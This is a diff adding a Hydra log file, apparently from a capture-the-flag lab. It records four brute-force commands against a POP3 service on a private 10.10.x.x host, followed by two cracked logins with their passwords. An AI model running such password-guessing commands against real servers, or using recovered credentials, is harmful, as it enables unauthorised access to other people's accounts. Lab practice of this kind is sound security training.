@@ -1,0 +1,6 @@
+# Hydra v9.5 run at 2024-07-10 17:38:43 on 10.10.214.255 pop3 (hydra -L users.txt -P /opt/wordlists/fasttrack.txt -I -o hydrascan/result_pop3 -t 64 pop3://10.10.214.255)
+# Hydra v9.5 run at 2024-07-10 17:39:10 on 10.10.214.255 pop3 (hydra -L users.txt -P /opt/wordlists/fasttrack.txt -I -o hydrascan/result_pop3 pop3://10.10.214.255)
+# Hydra v9.5 run at 2024-07-10 17:39:37 on 10.10.214.255 pop3 (hydra -L users.txt -P /opt/wordlists/fasttrack.txt -I -o hydrascan/result_pop3 -s 55007 pop3://10.10.214.255)
+# Hydra v9.5 run at 2024-07-10 17:41:00 on 10.10.214.255 pop3 (hydra -L users.txt -P /opt/wordlists/fasttrack.txt -I -o hydrascan/result_pop3 -s 55007 -t 64 pop3://10.10.214.255)
+[55007][pop3] host: 10.10.214.255   login: boris   password: secret1!
+[55007][pop3] host: 10.10.214.255   login: natalya   password: bird
